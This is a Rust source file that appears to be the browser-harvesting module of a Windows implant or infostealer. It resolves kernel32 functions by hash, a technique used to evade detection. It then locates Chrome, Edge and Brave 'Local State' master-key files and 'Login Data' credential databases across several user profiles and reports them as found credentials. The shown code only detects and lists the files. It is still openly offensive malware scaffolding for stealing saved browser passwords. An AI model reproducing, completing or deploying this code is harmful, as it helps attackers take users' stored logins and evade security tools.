#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::HANDLE;
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
pub struct Browser;

#[cfg(target_os = "windows")]
impl Browser {
    pub fn harvest(&self) -> Result<Vec<u8>, ()> {
        let mut results = Vec::new();
        results.extend_from_slice(b"Scanning for browser data...\n");

        let paths = [
            r"Google\Chrome\User Data",
            r"Microsoft\Edge\User Data",
            r"BraveSoftware\Brave-Browser\User Data",
        ];

        let local_app_data = self.get_local_app_data();
        if local_app_data.is_empty() { 
            results.extend_from_slice(b"Failed to resolve LOCALAPPDATA\n");
            return Ok(results);
        }

        for browser_path in paths {
            let full_path = format!("{}\\{}", local_app_data, browser_path); 
            
            // 1. Check for Local State (contains Master Key)
            let local_state = format!("{}\\{}", full_path, "Local State");
            if self.file_exists(&local_state) {
                results.extend_from_slice(format!("Found Local State: {}\n", local_state).as_bytes());
            }

            // 2. Check for Login Data in profiles
            let profiles = ["Default", "Profile 1", "Profile 2"];
            for profile in profiles {
                let login_data = format!("{}\\{}\\Login Data", full_path, profile);
                if self.file_exists(&login_data) {
                    results.extend_from_slice(format!("Found Credentials: {}\n", login_data).as_bytes());
                }
            }
        }

        Ok(results)
    }

    fn get_local_app_data(&self) -> alloc::string::String {
        unsafe {
            let k32 = hash_str(b"kernel32.dll");
            let get_env = resolve_function(k32, hash_str(b"GetEnvironmentVariableA"));
            if get_env.is_null() { return alloc::string::String::new(); }

            type FnGetEnvironmentVariableA = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
            let get_env_fn: FnGetEnvironmentVariableA = core::mem::transmute(get_env);

            let mut buf = [0u8; 260];
            let n = get_env_fn(b"LOCALAPPDATA\0".as_ptr(), buf.as_mut_ptr(), 260);
            if n > 0 {
                return alloc::string::String::from_utf8_lossy(&buf[..n as usize]).into_owned();
            }
        }
        alloc::string::String::new()
    }

    fn file_exists(&self, path: &str) -> bool {
        unsafe {
            let k32 = hash_str(b"kernel32.dll");
            let get_file_attrs = resolve_function(k32, hash_str(b"GetFileAttributesA"));
            if get_file_attrs.is_null() { return false; }

            type FnGetFileAttributesA = unsafe extern "system" fn(*const u8) -> u32;
            let get_file_attrs_fn: FnGetFileAttributesA = core::mem::transmute(get_file_attrs);

            let mut path_c = Vec::from(path.as_bytes());
            path_c.push(0);
            let attrs = get_file_attrs_fn(path_c.as_ptr());
            attrs != 0xFFFFFFFF
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub struct Browser;

#[cfg(not(target_os = "windows"))]
impl Browser {
    pub fn harvest(&self) -> Result<Vec<u8>, ()> {
        Ok(alloc::vec::Vec::from(b"Browser harvesting not supported on Linux" as &[u8]))
    }
}
